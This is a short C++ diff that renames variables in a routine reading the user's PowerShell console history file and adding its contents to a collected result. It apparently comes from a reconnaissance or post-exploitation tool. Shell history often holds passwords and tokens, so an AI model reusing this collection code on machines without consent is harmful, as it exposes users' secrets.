@@ -11,15 +11,15 @@ namespace Task
         std::wstring envLocalAppData = System::Env::GetStrings(L"%LOCALAPPDATA%");
 
         // Read PowerShell history file
-        std::wstring psHistoryFile = envAppData + L"\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";
-        std::vector<char> psHistoryBytes = System::Fs::ReadBytesFromFile(psHistoryFile);
-        if (psHistoryBytes.size() > 0)
+        std::wstring wHistoryFile = envAppData + L"\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";
+        std::vector<BYTE> historyBytes = System::Fs::ReadBytesFromFile(wHistoryFile);
+        if (historyBytes.size() > 0)
         {
-            result += psHistoryFile + L"\n";
-            result += std::wstring(wcslen(psHistoryFile.c_str()), L'-') + L"\n";
+            result += wHistoryFile + L"\n";
+            result += std::wstring(wcslen(wHistoryFile.c_str()), L'-') + L"\n";
 
-            std::wstring wPsHistory = Utils::Convert::UTF8Decode(Utils::Convert::VecCharToString(psHistoryBytes));
-            result += wPsHistory + L"\n\n";
+            std::wstring wHistory = Utils::Convert::UTF8Decode(Utils::Convert::VecByteToString(historyBytes));
+            result += wHistory + L"\n\n";
         }
 
         // std::vector<std::wstring> historyFiles = {
